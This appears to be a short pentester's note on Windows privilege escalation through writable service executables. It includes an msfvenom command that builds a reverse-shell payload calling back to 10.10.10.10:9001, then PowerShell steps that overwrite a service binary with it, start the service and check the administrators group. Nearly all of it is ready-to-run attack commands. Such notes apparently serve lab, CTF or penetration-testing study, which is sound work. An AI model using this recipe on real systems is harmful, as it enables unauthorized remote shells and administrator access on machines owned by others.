[[Dark Arts/Privesc/Windows/Enumeration/Service Executable Files|Enum]]
#### Payload
First make a malicious executable.
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=9001 -f exe -o x.exe
```
Then [[Dark Arts/File Transfer/Windows|file transfer]] it to target.
#### Exploit
On target box
```powershell
# overwrite original executable file found in the enum linked above, below is just an example file
copy x.exe "C:\Program Files\File Permissions Service\filepermservice.exe"

# then just start the service in question, again this is identified in the enum steps linked above and the following is just an example
sc start filepermsvc

# You should get a reverse shell, or whatever behavior you put into your payload. if it was adding "user" to "administrators" group, check it worked:
net localgroup administrators

# then log in as "user"
```
